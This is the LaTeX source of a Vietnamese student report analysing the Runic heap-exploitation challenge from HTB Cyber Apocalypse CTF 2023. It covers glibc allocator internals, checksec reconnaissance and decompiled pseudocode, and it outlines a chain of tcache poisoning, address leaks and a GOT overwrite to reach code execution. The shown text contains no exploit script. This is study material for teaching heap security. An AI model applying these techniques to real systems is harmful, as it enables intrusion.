% !TEX program = xelatex
\documentclass{report}
\usepackage[fontsize=11pt]{scrextend}

% Language setting
% Replace `english' with e.g. `spanish' to change the document language
\usepackage[english]{babel}

% Custom numbering for sections and subsections
\renewcommand{\thesection}{\Roman{section}.}
\renewcommand{\thesubsection}{\arabic{section}.\arabic{subsection}.}

% Set page size and margins
% Replace `letterpaper' with `a4paper' for UK/EU standard size
\usepackage[a4paper,top=1.5cm,bottom=1.5cm,left=1.5cm,right=1.5cm,marginparwidth=1.5cm]{geometry}

% Paragraph formatting
\usepackage{indentfirst}
\setlength{\parindent}{1.5em}
\setlength{\parskip}{0.5em}

% Useful packages
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage[colorlinks=true, allcolors=blue]{hyperref}
\usepackage{xcolor}
\usepackage{fancyvrb}
\usepackage{listings}
\usepackage{float}

% Define color for inline code
\definecolor{codebg}{rgb}{0.95, 0.95, 0.95}
\definecolor{codetext}{rgb}{1, 0.4, 0.2}
\let\oldtexttt\texttt
\renewcommand{\texttt}[1]{\colorbox{codebg}{\textcolor{codetext}{\oldtexttt{#1}}}}

% Configure listings for C code blocks
\lstset{
  language=C,
  basicstyle=\small\ttfamily,
  keywordstyle=\color{blue}\bfseries,
  commentstyle=\color{gray},
  stringstyle=\color{red},
  breaklines=true,
  showstringspaces=false,
  backgroundcolor=\color{codebg},
  frame=single,
  framesep=5pt,
  xleftmargin=0.5cm,
  xrightmargin=0.5cm,
  columns=fullflexible
}

\title{
    \includegraphics[width=0.2\textwidth]{images/uet.png}\\[1em]
    \huge Báo cáo đồ án môn An toàn và an ninh mạng\\
    \large Lớp học phần: INT3307E 1\\
    \large Giảng viên: TS. Nguyễn Đại Thọ
}

\author{Nguyễn Tường Hùng – 23020078}

\begin{document}
\maketitle

\begin{abstract}
Đồ án này trình bày quá trình phân tích và khai thác lỗ hổng bảo mật trong thử thách Runic thuộc HTB Cyber Apocalypse CTF 2023, một chương trình C 64-bit được bảo vệ bởi các cơ chế hiện đại như ASLR, NX, PIE và Full RELRO. Thông qua reverse engineering và code review, xác định lỗ hổng heap buffer overflow phát sinh từ việc sử dụng không an toàn hàm \texttt{strcpy()} kết hợp với \texttt{read()} trong quá trình xử lý input chứa NULL bytes, dẫn đến hash confusion. Khai thác lỗ hổng này, kẻ tấn công có thể thực hiện tcache poisoning để leak địa chỉ heap và libc, bypass ASLR, sau đó ghi đè GOT entry của \texttt{strlen()} trong libc thành \texttt{system()}, cuối cùng đạt được Remote Code Execution. Đồ án minh họa chi tiết chuỗi tấn công hoàn chỉnh và đề xuất các biện pháp phòng thủ như sử dụng \texttt{memcpy()} và validate input nghiêm ngặt.
\end{abstract}

\clearpage
\tableofcontents

\clearpage
\section{Introduction}

HTB Cyber Apocalypse CTF 2023: The Cursed Mission là sự kiện Capture The Flag (CTF) quy mô quốc tế do Hack The Box tổ chức từ ngày 18-23 tháng 3 năm 2023, thu hút sự tham gia của hơn 12,000 hackers từ khắp nơi trên thế giới. Cuộc thi cung cấp hơn 40 thử thách trải dài trên nhiều lĩnh vực bảo mật khác nhau bao gồm Web Exploitation, Binary Exploitation (Pwn), Forensics, Cryptography, Hardware, Machine Learning và Blockchain, với độ khó từ Very Easy đến Insane, mang đến cơ hội cho người tham gia thử thách kỹ năng tấn công và phòng thủ trong các kịch bản mô phỏng thực tế.

\subsection{Pwn Challenge: Runic}

Đồ án này tập trung vào việc phân tích Runic, một trong những thử thách thuộc mảng Binary Exploitation của cuộc thi. Runic là một chương trình C 64-bit sử dụng ptmalloc (GLIBC malloc implementation) để quản lý cấp phát động, được bảo vệ bởi các cơ chế bảo mật hiện đại như ASLR, NX, Full RELRO, và PIE. Thử thách yêu cầu người chơi phát hiện và khai thác các lỗ hổng trong chương trình và bypass các cơ chế bảo vệ này, cuối cùng đạt được Remote Code Execution và thu thập flag. Đồ án trình bày chi tiết quá trình phân tích, phát hiện lỗ hổng, xây dựng exploit, cho đến việc thực thi chuỗi tấn công hoàn chỉnh, và cuối cùng là các biện pháp giảm thiểu.

\subsection{Lỗ hổng chính}

Lỗ hổng cốt lõi trong Runic nằm ở việc xử lý chuỗi ký tự không đúng cách (improper string handling), cụ thể là trong quá trình sao chép chuỗi. Khi chương trình sử dụng hàm \texttt{strcpy()} để sao chép dữ liệu đầu vào vào buffer, nếu dữ liệu không được NULL-terminated hoặc chứa NULL bytes ở vị trí không mong đợi, \texttt{strcpy()} sẽ tiếp tục sao chép vượt quá ranh giới buffer đã cấp phát hoặc sao chép thiếu dữ liệu ban đầu. Điều này có thể dẫn đến heap buffer overflow - một lỗ hổng cho phép ghi dữ liệu vượt quá ranh giới chunk và ghi đè metadata của các chunks liền kề.

Thông qua heap buffer overflow, kẻ tấn công có thể thao túng các metadata quan trọng của ptmalloc như trường \texttt{size} và con trỏ \texttt{fd} trong free chunks, cho phép thực hiện các kỹ thuật khai thác tinh vi như tcache poisoning và unsorted bin exploitation. Việc kiểm soát metadata này, kết hợp với khả năng bypass các cơ chế bảo vệ hiện đại của GLIBC, cuối cùng giúp kẻ tấn công đạt được hai primitives mạnh mẽ: Arbitrary Address Write (khả năng ghi dữ liệu vào địa chỉ bất kỳ) và Arbitrary Address Read (khả năng đọc dữ liệu từ địa chỉ bất kỳ). Với AAR, kẻ tấn công leak được các địa chỉ quan trọng như libc base và heap base để vượt qua ASLR. Với AAW, kẻ tấn công ghi đè các cấu trúc dữ liệu quan trọng như GOT entries hoặc các con trỏ hàm, từ đó chuyển hướng luồng thực thi của chương trình để đạt được Remote Code Execution (RCE) và thu thập flag.

\subsection{Phương pháp và công cụ}

Phương pháp phân tích chính được sử dụng trong tài liệu này là \textbf{code review} - đọc và phân tích source code để hiểu logic chương trình và xác định các điểm yếu có thể khai thác. Quá trình này được hỗ trợ bởi ba công cụ chính: \textbf{IDA Pro} để thực hiện reverse engineering và static analysis, giúp hiểu rõ cấu trúc chương trình, luồng thực thi và các hàm quan trọng; \textbf{pwndbg} - một plugin mạnh mẽ cho GDB - để thực hiện dynamic analysis, debug chương trình trong runtime, quan sát trạng thái heap, kiểm tra giá trị các con trỏ và metadata của chunks, cũng như xác minh các giả thuyết và theo dõi hoạt động của exploit; và \textbf{pwntools} - một framework Python được thiết kế đặc biệt cho CTF - để viết exploit script tự động hóa quá trình tấn công, giao tiếp với chương trình target và xử lý các encoding/packing dữ liệu cần thiết.

\subsection{Sử dụng AI trong tài liệu}

\textbf{Claude Code}, một công cụ AI được phát triển bởi Anthropic, được sử dụng để hỗ trợ hoàn thiện báo cáo đồ án này và quá trình reverse engineering khi review pseudocode. Toàn bộ công việc kỹ thuật bao gồm phân tích lỗ hổng, thiết kế và xây dựng exploit, debug, đều do sinh viên tự tham khảo và thực hiện. Việc sử dụng AI được công khai rõ ràng nhằm đảm bảo tính minh bạch và tuân thủ các chuẩn mực học thuật.

\clearpage
\section{Background}

\subsection{Ptmalloc và Heap Chunk Structure}

Ptmalloc là memory allocator mặc định trong GNU C Library, chịu trách nhiệm quản lý cấp phát động thông qua các hàm \texttt{malloc()}, \texttt{free()}, và các hàm liên quan. Đơn vị quản lý cơ bản của ptmalloc là chunk - một khối bộ nhớ liên tục bao gồm metadata (thông tin quản lý) và user data:

\begin{lstlisting}
struct malloc_chunk {
    size_t      prev_size;  // Size of previous chunk (if free)
    size_t      size;       // Size of current chunk + flags
    malloc_chunk* fd;       // Forward pointer (free chunks only)
    malloc_chunk* bk;       // Backward pointer (free chunks only)
};
\end{lstlisting}

Khi chunk được cấp phát, chương trình chỉ nhìn thấy phần user data. Tuy nhiên khi chunk được giải phóng, ptmalloc tái sử dụng chính vùng user data này để lưu trữ các con trỏ \texttt{fd} (forward) và \texttt{bk} (backward), liên kết chunk vào các danh sách bins để tái sử dụng sau này. Trường \texttt{size} không chỉ lưu kích thước chunk mà còn sử dụng 3 bit thấp nhất làm flags, trong đó quan trọng nhất là \textbf{PREV\_INUSE bit} (bit 0): nếu bit này được set (= 1), chunk trước đó đang được sử dụng; nếu bằng 0, chunk trước đó đã được giải phóng. Bit này được ptmalloc sử dụng để thực hiện consolidation (gộp các free chunks liền kề nhằm tránh phân mảnh bộ nhớ) và phát hiện các lỗi double-free.

\subsection{Heap Allocation và Deallocation}

Khi \texttt{malloc()} được gọi, ptmalloc không đơn giản yêu cầu kernel cấp phát memory mới mà tìm kiếm các chunks đã được giải phóng trước đó để tái sử dụng. Quá trình tìm kiếm diễn ra theo thứ tự ưu tiên: tcache bins (nhanh nhất, không cần lock) được kiểm tra đầu tiên, tiếp theo là fastbins và smallbins cho các chunks nhỏ, sau đó là unsorted bin, largebins cho chunks lớn, và cuối cùng là top chunk. Chỉ khi không tìm thấy chunk phù hợp, ptmalloc mới yêu cầu kernel mở rộng heap.

Khi \texttt{free()} được gọi, chunk không thực sự được trả về cho kernel mà được đưa vào các bins để \texttt{malloc()} có thể tái sử dụng. Chunk sẽ được đưa vào tcache trước tiên nếu tcache chưa đầy. Nếu chunk không thuộc tcache size hoặc tcache đã đầy, ptmalloc sẽ thực hiện consolidation - gộp chunk với các free chunks liền kề để tạo thành một chunk lớn hơn, sau đó đưa vào unsorted bin hoặc fastbins tùy thuộc vào kích thước.

\subsection{Tcache Bins}

Thread-local cache (tcache) là cơ chế cache quan trọng được giới thiệu từ GLIBC 2.26 nhằm tối ưu hiệu suất allocation trong môi trường đa luồng. Mỗi thread duy trì 64 tcache bins riêng biệt, mỗi bin chứa tối đa 7 chunks có cùng kích thước (từ 0x20 đến 0x410 bytes, cách nhau 0x10 bytes). Điểm đặc biệt của tcache là tính đơn giản và tốc độ: tcache sử dụng singly-linked list (chỉ có con trỏ \texttt{fd} trỏ đến chunk tiếp theo), hoạt động theo cơ chế LIFO, và quan trọng nhất là \textbf{không cần lock} vì mỗi thread có tcache riêng. Điều này giúp tcache cực kỳ nhanh nhưng cũng khiến nó dễ bị khai thác do thiếu các security checks, đặc biệt trước GLIBC 2.32.

Từ GLIBC 2.32, tcache áp dụng cơ chế \textbf{Safe-Linking} để bảo vệ con trỏ \texttt{fd}. Thay vì lưu trực tiếp địa chỉ chunk tiếp theo, con trỏ được mã hóa theo công thức $\text{PROTECT}(P) = (L \gg 12) \oplus P$, trong đó $L$ là địa chỉ heap nơi con trỏ \texttt{fd} được lưu trữ và $P$ là địa chỉ thực của chunk tiếp theo. Cơ chế này vừa ngăn chặn việc ghi đè \texttt{fd} tùy ý, vừa tạo ra cơ hội để leak heap address khi kẻ tấn công có thể đọc giá trị \texttt{fd} đã mã hóa. Ngoài ra, ptmalloc yêu cầu tất cả chunks hợp lệ phải được cấp phát tại địa chỉ được căn chỉnh 16 bytes (\textbf{alignment check}), tức địa chỉ phải chia hết cho 16.

\subsection{Unsorted Bin}

Unsorted bin là một bin đặc biệt trong ptmalloc, hoạt động như "trạm trung chuyển" cho các chunks lớn vừa được giải phóng. Đây là doubly-linked circular list chứa các chunks có kích thước bất kỳ (không thuộc fastbin/tcache size) chưa được sắp xếp. Khi một chunk lớn được \texttt{free()}, nếu không được đưa vào tcache, chunk sẽ được consolidate với các free chunks liền kề rồi đưa vào unsorted bin. Trong quá trình \texttt{malloc()} tiếp theo, ptmalloc quét unsorted bin để tìm chunk phù hợp hoặc sắp xếp chunks vào smallbins/largebins tương ứng.

Khi chunk được đưa vào unsorted bin, ptmalloc tự động ghi hai con trỏ \texttt{fd} và \texttt{bk} vào vùng user data của chunk, trỏ về main arena structure nằm trong vùng nhớ libc. Bằng cách đọc các con trỏ này (thông qua các lỗ hổng cho phép đọc memory), kẻ tấn công có thể leak địa chỉ trong libc và tính ngược lại libc base address, từ đó tính toán địa chỉ của bất kỳ hàm nào trong libc như \texttt{system()} hay \texttt{execve()}.

\subsection{Heap Buffer Overflow}

Heap buffer overflow là lỗ hổng xảy ra khi chương trình ghi dữ liệu vượt quá ranh giới của một chunk đã được cấp phát. Do các chunks được sắp xếp liền kề nhau trên heap, việc ghi tràn từ chunk này có thể ghi đè lên metadata hoặc user data của chunk liền sau. Các metadata quan trọng có thể bị ghi đè bao gồm trường \texttt{size} (để giả mạo kích thước chunk, khai thác logic bugs hoặc bypass các checks), con trỏ \texttt{fd} (để thực hiện tcache/fastbin poisoning), và cặp con trỏ \texttt{fd}/\texttt{bk} (để thực hiện các kỹ thuật như unlink attack hoặc leak addresses). Heap buffer overflow thường được kết hợp với các lỗ hổng khác như use-after-free hoặc logic bugs để tạo thành chuỗi khai thác hoàn chỉnh.

\subsection{Tcache Poisoning}

Tcache poisoning là kỹ thuật khai thác heap phổ biến nhằm kiểm soát việc allocation để \texttt{malloc()} trả về một chunk tại địa chỉ tùy ý mà kẻ tấn công chọn. Tcache bin hoạt động như một singly-linked list, với mỗi chunk có con trỏ \texttt{fd} trỏ đến chunk tiếp theo. Khi \texttt{malloc()} được gọi với kích thước phù hợp, ptmalloc lấy chunk đầu tiên ra khỏi bin, đọc con trỏ \texttt{fd} của chunk này để biết chunk tiếp theo, cập nhật head của bin, rồi trả về chunk cho chương trình. Nếu kẻ tấn công có khả năng ghi đè con trỏ \texttt{fd} của chunk trong tcache (thông qua use-after-free hoặc heap overflow) để trỏ đến một địa chỉ target bất kỳ, lần \texttt{malloc()} tiếp theo sẽ coi địa chỉ target là một chunk hợp lệ và trả về địa chỉ đó, cho phép kẻ tấn công ghi dữ liệu vào vị trí mong muốn.

\subsection{Security Mitigations}

GLIBC hiện đại triển khai nhiều cơ chế bảo vệ để ngăn chặn khai thác heap, bao gồm double-free detection thông qua tcache key, Safe-Linking (từ GLIBC 2.32), loại bỏ malloc hooks (từ GLIBC 2.34), kiểm tra chunk alignment, và phát hiện metadata corruption như kiểm tra PREV\_INUSE bit và tính nhất quán của size. Tuy nhiên, các cơ chế bảo vệ này không hoàn toàn ngăn chặn được các khai thác tinh vi, đặc biệt khi được kết hợp với lỗ hổng logic.

\clearpage
\section{Initial Reconnaissance}

Trong challenge này, ba file được cung cấp bao gồm file thực thi \texttt{runic}, thư viện C chuẩn \texttt{libc.so.6}, và dynamic linker \texttt{ld.so}:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-12.png}
\caption{Các file được cung cấp}
\end{figure}

File \texttt{libc.so.6} là thư viện C chuẩn (GNU C Library) chứa các hàm cơ bản của ngôn ngữ C như \texttt{malloc()}, \texttt{free()}, \texttt{printf()},... và các system call wrappers. Việc cung cấp phiên bản cụ thể của libc giúp đảm bảo tính nhất quán trong quá trình khai thác, vì các cơ chế bảo vệ, cấu trúc dữ liệu heap, và địa chỉ các hàm có thể khác nhau giữa các phiên bản.

File \texttt{ld.so} là dynamic linker/loader, chương trình chịu trách nhiệm load các shared libraries vào memory và resolve địa chỉ các symbol trong libc khi chương trình được thực thi. Dynamic linker đảm bảo rằng các hàm từ libc và các thư viện khác được liên kết đúng cách với địa chỉ trong không gian bộ nhớ của process.

\subsection{GLIBC Version}

Kết quả từ lệnh \texttt{strings libc.so.6 | grep "GLIBC\_2."} trong Figure 2 cho thấy thư viện được cung cấp là GLIBC phiên bản \texttt{2.34}, được xác định thông qua symbol version cao nhất là \texttt{GLIBC\_2\_34}. Việc xác định chính xác phiên bản GLIBC là bước quan trọng trong quá trình phân tích và khai thác các lỗ hổng liên quan đến heap.

Phiên bản GLIBC có ảnh hưởng trực tiếp đến cơ chế quản lý heap và các biện pháp bảo vệ được triển khai. Cụ thể, GLIBC \texttt{2.34} là phiên bản quan trọng vì đã loại bỏ hoàn toàn các hook functions như \texttt{\_\_malloc\_hook}, \texttt{\_\_free\_hook}, và \texttt{\_\_realloc\_hook} - những target phổ biến trong các kỹ thuật khai thác heap truyền thống. Ngoài ra, mỗi phiên bản GLIBC có các cấu trúc dữ liệu heap khác nhau về offset, size, và cách tổ chức tcache bins, fastbins, unsorted bins. Các kiểm tra an ninh (security checks) như tcache key, safe-linking trong fastbins, và các validation khác cũng được bổ sung hoặc thay đổi qua các phiên bản.

\begin{figure}[H]
\centering
\includegraphics[width=0.75\linewidth]{images/image-11.png}
\caption{Xác định phiên bản GLIBC}
\end{figure}

\subsection{Binary Mitigations}

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-10.png}
\caption{Kết quả checksec}
\end{figure}

Kết quả phân tích từ công cụ \texttt{checksec} trong Figure 3 cho thấy file thực thi \texttt{runic} được biên dịch cho kiến trúc \texttt{amd64-64-little} với các cơ chế bảo vệ như sau:

\begin{itemize}
    \item \textbf{Full RELRO}: Toàn bộ Global Offset Table (GOT) được đánh dấu read-only sau khi dynamic linker hoàn tất quá trình linking, ngăn chặn hoàn toàn khả năng ghi đè địa chỉ hàm trong GOT.

    \item \textbf{Canary found}: Chương trình được bảo vệ bởi stack canaries - một giá trị ngẫu nhiên được đặt trên stack frame trước return address. Nếu canary bị thay đổi do buffer overflow, chương trình sẽ terminate trước khi thực thi return.

    \item \textbf{NX enabled}: Vùng nhớ dữ liệu (stack và heap) được đánh dấu non-executable, ngăn chặn việc thực thi shellcode được inject vào các vùng này.

    \item \textbf{PIE enabled}: Binary được load vào địa chỉ ngẫu nhiên trong bộ nhớ mỗi lần thực thi (Address Space Layout Randomization), khiến địa chỉ của code và data không thể dự đoán được.

    \item \textbf{RUNPATH = '.'}: Dynamic linker được cấu hình tìm kiếm shared libraries trong thư mục hiện tại, đảm bảo chương trình sử dụng đúng phiên bản libc được cung cấp kèm theo challenge.

    \item \textbf{Stripped: No}: Binary vẫn giữ nguyên debug symbols và tên hàm gốc, tạo điều kiện thuận lợi cho quá trình reverse engineering và phân tích.
\end{itemize}

\clearpage
\section{Pseudocode Review}

\subsection{\texttt{rune} Struct}

Với sự trợ giúp của công cụ Claude trong việc phân tích mã giả, cấu trúc \texttt{rune} được xác định với kích thước \texttt{24} bytes (\texttt{0x18}). Cấu trúc này bao gồm các trường sau:
\begin{itemize}
    \item \texttt{name[8]}: mảng 8 bytes chứa tên của rune.
    \item \texttt{*content}: con trỏ 8 bytes trỏ đến nội dung của rune.
    \item \texttt{length}: số nguyên không dấu 4 bytes lưu độ dài nội dung.
    \item \texttt{padding}: 4 bytes padding để căn chỉnh cấu trúc.
\end{itemize}

\begin{lstlisting}
00000000 struct rune // sizeof=0x18
00000000 {
00000000     char name[8];
00000008     char *content;
00000010     unsigned int length;
00000014     unsigned int padding;
00000018 };
\end{lstlisting}

Cấu trúc \texttt{rune} có thể minh hoạ như sau:

\begin{figure}[H]
\centering
\includegraphics[width=0.5\linewidth]{images/image-9.png}
\caption{Cấu trúc \texttt{rune}}
\end{figure}

\subsection{\texttt{main()} Function}

\begin{lstlisting}
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int action; // [rsp+Ch] [rbp-4h]

  setup(argc, argv, envp);
  puts(
    "This is the ultimate test!\n"
    "Do you have what it takes to master the runes?\n"
    "Are you worthy of laying your eyes on the Pharaoh's tomb?\n"
    "Only your actions will tell...");
  while ( 1 )
  {
    while ( 1 )
    {
      puts("1. Create rune\n2. Delete rune\n3. Edit rune\n4. Show rune\nAction: ");
      action = read_int();
      if ( action != 4 )
        break;
      show();
    }
    if ( action > 4 )
    {
invalid_action:
      puts("Invalid action!");
    }
    else if ( action == 3 )
    {
      edit();
    }
    else
    {
      if ( action > 3 )
        goto invalid_action;
      if ( action == 1 )
      {
        create();
      }
      else
      {
        if ( action != 2 )
          goto invalid_action;
        delete();
      }
    }
  }
}
\end{lstlisting}

Tại hàm \texttt{main()}, chương trình bắt đầu với lời gọi hàm \texttt{setup()}, sau đó đi vào vòng lặp \texttt{while} cho phép người dùng lựa chọn 1 trong 4 hành động:

\begin{enumerate}
    \item Tạo \texttt{rune}.
    \item Xóa \texttt{rune}.
    \item Chỉnh sửa \texttt{rune}.
    \item Hiển thị \texttt{rune}.
\end{enumerate}

Tuy nhiên không cung cấp lựa chọn nào để thoát khỏi chương trình.

\subsection{\texttt{setup()} Function}

\begin{lstlisting}
int setup()
{
  rune **v0; // rax
  int i; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  LODWORD(v0) = setvbuf(stderr, 0, 2, 0);
  for ( i = 0; i <= 63; ++i )
  {
    v0 = MainTable;
    MainTable[i] = &items[i];
  }
  return (int)v0;
}
\end{lstlisting}

Qua quan sát mã giả của hàm \texttt{setup()}, các biến toàn cục chính được xác định như sau:

\begin{itemize}
  \item \texttt{rune items[64]} - Mảng chứa 64 phần tử với kiểu dữ liệu \texttt{rune}, mỗi phần tử có kích thước 24 bytes.
  \item \texttt{rune *MainTable[64]} - Mảng chứa 64 phần tử với kiểu dữ liệu là con trỏ \texttt{rune *}.
\end{itemize}

Mối quan hệ giữa \texttt{MainTable} và \texttt{items} được minh họa trong hình dưới đây. Ban đầu, mỗi phần tử \texttt{MainTable[i]} trỏ đến phần tử tương ứng \texttt{items[i]}, tạo thành một ánh xạ một-một giữa hai mảng.

\begin{figure}[H]
\centering
\includegraphics[width=0.75\linewidth]{images/image-0.png}
\caption{Mối quan hệ giữa mảng con trỏ \texttt{MainTable} và mảng dữ liệu \texttt{items}}
\end{figure}

\subsection{\texttt{create()} Function}

\begin{lstlisting}
unsigned __int64 create()
{
  int index; // [rsp+0h] [rbp-20h]
  unsigned int length; // [rsp+4h] [rbp-1Ch]
  char *content; // [rsp+8h] [rbp-18h]
  char name[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  *(_QWORD *)name = 0;
  puts("Rune name: ");
  read(0, name, 8u);
  index = hash(name);
  if ( MainTable[(unsigned int)hash(name)]->content )
  {
    puts("That rune name is already in use!");
  }
  else
  {
    puts("Rune length: ");
    length = read_int();
    if ( length <= 0x60 )
    {
      content = (char *)malloc(length + 8);
      strcpy(MainTable[index]->name, name);
      MainTable[index]->content = content;
      MainTable[index]->length = length;
      strcpy(content, name);
      puts("Rune contents: ");
      read(0, content + 8, length);
    }
    else
    {
      puts("Max length is 0x60!");
    }
  }
  return __readfsqword(0x28u) ^ canary;
}
\end{lstlisting}

Hàm \texttt{create()} cung cấp chức năng tạo một rune mới. Người dùng nhập \texttt{name} dài tối đa \texttt{8} bytes. Giá trị index được tính thông qua hàm băm \texttt{hash(name)}, cho thấy chương trình đang triển khai một cấu trúc Hash Table.

Sau khi tính toán index, chương trình kiểm tra con trỏ \texttt{content} của rune tương ứng để nhằm xác định tên đã được sử dụng hay chưa. Nếu con trỏ \texttt{content} khác NULL (đã được sử dụng), thông báo "That rune name is already in use!" được in ra và hàm kết thúc. Ngược lại, người dùng tiếp tục nhập vào độ dài nội dung, tối đa \texttt{0x60} bytes.

Một chunk (vùng nhớ) sẽ được cấp phát trên heap với kích thước bằng độ dài của nội dung được nhập cộng thêm \texttt{8} bytes, được trỏ đến bởi con trỏ \texttt{content}. Các giá trị được sao chép vào các trường tương ứng trong cấu trúc rune. Đặc biệt, trường \texttt{name} được sao chép thêm một lần nữa vào vị trí bắt đầu của chunk, còn nội dung sẽ được ghi vào tại vị trí offset là \texttt{8}. 

Dưới đây là hình ảnh minh hoạ tổng quát về một rune được tạo (khối bên phải cùng là cấu trúc của một heap chunk được triển khai trong GLIBC):

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-8.png}
\caption{Cái nhìn tổng quát về một \texttt{rune}}
\end{figure}

\subsection{\texttt{hash()} Function}

\begin{lstlisting}
  __int64 __fastcall hash(char *name)
  {
    char ascii_sum; // [rsp+10h] [rbp-8h]
    int i; // [rsp+14h] [rbp-4h]
    
    ascii_sum = 0;
    for ( i = 0; i <= 7; ++i )
    ascii_sum += name[i];
    return ascii_sum & 0x3F;                      // sum & 0b111111
    }
\end{lstlisting}
  
Hàm \texttt{hash()} thực hiện tính toán tổng các giá trị ASCII của từng ký tự trong tên, sau đó thực hiện phép toán bitwise AND với \texttt{0x3F}, tương đương với phép modulo \texttt{64}. Giá trị trả về nằm trong khoảng $\texttt{0} \rightarrow \texttt{63}$.

\subsection{\texttt{delete()} Function}

\begin{lstlisting}
unsigned __int64 delete()
{
  int index; // [rsp+Ch] [rbp-14h]
  char name[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  *(_QWORD *)name = 0;
  puts("Rune name: ");
  read(0, name, 8u);
  index = hash(name);
  if ( MainTable[index]->content )
  {
    free(MainTable[index]->content);
    memset(MainTable[index], 0, 20u);
    puts("Rune deleted successfully.");
  }
  else
  {
    puts("There's no rune with that name!");
  }
  return __readfsqword(0x28u) ^ canary;
}
\end{lstlisting}

Hàm \texttt{delete()} cho phép người dùng xoá một rune. Hàm yêu cầu nhập \texttt{name} để tính toán index trong mảng \texttt{MainTable[]} thông qua hàm \texttt{hash()}.

Hàm được triển khai một cách an toàn. Trước khi thực hiện \texttt{free()}, con trỏ \texttt{content} được kiểm tra được so sánh với NULL nhằm tránh lỗ hổng Double Free. Nếu con trỏ \texttt{content} là NULL, thông báo "There's no rune with that name!" được in ra và hàm kết thúc. Ngược lại, chương trình thực hiện giải phóng \texttt{free(content)}, và đặt toàn bộ dữ liệu của phần tử rune tương ứng về NULL thông qua \texttt{memset()}, tránh được lỗ hổng User After Free.

\subsection{\texttt{show()} Function}

\begin{lstlisting}
unsigned __int64 show()
{
  int index; // eax
  char name[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 canary; // [rsp+8h] [rbp-8h]

  canary = __readfsqword(0x28u);
  *(_QWORD *)name = 0;
  puts("Rune name: ");
  read(0, name, 8u);
  if ( MainTable[(unsigned int)hash(name)]->content )
  {
    puts("Rune contents:\n");
    index = hash(name);
    puts((const char *)MainTable[index]->content + 8);
  }
  else
  {
    puts("That rune doesn't exist!");
  }
  return __readfsqword(0x28u) ^ canary;
}
\end{lstlisting}

Hàm \texttt{show()} cho phép người dùng in ra rune \texttt{content} tại vị trí có offset là \texttt{8}.

\subsection{\texttt{edit()} Function}

\begin{lstlisting}
unsigned __int64 edit()
{
  int new_index; // eax MAPDST
  char **content_ptr; // rbx
  int old_index; // eax
  int current_index; // eax
  char *content; // [rsp+0h] [rbp-30h]
  char old_name[8]; // [rsp+8h] [rbp-28h] BYREF
  char new_name[8]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 canary; // [rsp+18h] [rbp-18h]

  canary = __readfsqword(0x28u);
  *(_QWORD *)old_name = 0;
  *(_QWORD *)new_name = 0;
  puts("Rune name: ");
  read(0, old_name, 8u);
  content = MainTable[(unsigned int)hash(old_name)]->content;
  if ( content )
  {
    puts("New name: ");
    read(0, new_name, 8u);
    if ( MainTable[(unsigned int)hash(new_name)]->content )
    {
      puts("That rune name is already in use!");
    }
    else
    {
      new_index = hash(new_name);
      strcpy(MainTable[new_index]->name, new_name);
      content_ptr = &MainTable[(unsigned int)hash(old_name)]->content;
      new_index = hash(new_name);
      memcpy(&MainTable[new_index]->content, content_ptr, 12u);
      strcpy(content, new_name);
      old_index = hash(old_name);
      memset(MainTable[old_index], 0, 20u);
      puts("Rune contents: ");
      current_index = hash(content);
      read(0, content + 8, MainTable[current_index]->length);
    }
  }
  else
  {
    puts("There's no rune with that name!");
  }
  return __readfsqword(0x28u) ^ canary;
}
\end{lstlisting}

Hàm \texttt{edit()} cho phép người dùng thay đổi tên và nội dung của rune đã tồn tại. Hàm yêu cầu nhập vào tên cũ \texttt{old\_name} và tên mới \texttt{new\_name} của rune. Chỉ trong trường hợp \texttt{content} tại index được tính bởi hash của \texttt{old\_name} tồn tại và \texttt{content} tại index được tính bởi hash của \texttt{new\_name} chưa tồn tại, người dùng mới được phép tiếp tục thực thi. Ngược lại, hàm sẽ kết thúc.

Chuỗi hình minh hoạ dưới đây mô tả hoạt động của hàm \texttt{edit()}:

\begin{lstlisting}
new_index = hash(new_name);
strcpy(MainTable[new_index]->name, new_name);
content_ptr = &MainTable[(unsigned int)hash(old_name)]->content;
\end{lstlisting}

Ban đầu, con trỏ tại \texttt{old\_index} trong \texttt{MainTable} đang trỏ đến rune có tên là \texttt{old\_name} (gọi là rune A), có con trỏ \texttt{content} trỏ đến chunk trên heap (gọi là chunk C). Con trỏ tại \texttt{new\_index} trỏ đến rune có tên là \texttt{new\_name} (gọi là rune B).

Sau 3 thao tác trên, sơ đồ trông như sau:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-1.png}
\caption{Trạng thái ban đầu: Rune A trỏ đến chunk C, Rune B chưa có chunk}
\end{figure}

\begin{lstlisting}
new_index = hash(new_name);
memcpy(&MainTable[new_index]->content, content_ptr, 12u);
strcpy(content, new_name);
\end{lstlisting}

Tiếp theo, chương trình sao chép trường \texttt{*content} và \texttt{length} của rune A sang rune B:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-2.png}
\caption{Sau khi sao chép con trỏ \texttt{content} và \texttt{length} từ Rune A sang Rune B}
\end{figure}

\begin{lstlisting}
old_index = hash(old_name);
memset(MainTable[old_index], 0, 20u);
\end{lstlisting}

Tiếp theo, chương trình xóa bỏ nội dung ở rune A (đặt về NULL):

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-3.png}
\caption{Sau khi xóa nội dung Rune A (memset về NULL)}
\end{figure}

\begin{lstlisting}
current_index = hash(content);
read(0, content + 8, MainTable[current_index]->length);
\end{lstlisting}

Tiếp theo, chương trình tính \texttt{current\_index} dựa vào nội dung đã được ghi vào chunk C (\texttt{new\_name}) và gọi hàm \texttt{read()} cho phép người dùng ghi nội dung vào vị trí \texttt{content + 8}:

\begin{figure}[H]
\centering
\includegraphics[width=\linewidth]{images/image-4.png}
\caption{Tính \texttt{current\_index} dựa trên \texttt{hash(content)} và ghi dữ liệu vào \texttt{content + 8}}
\end{figure}

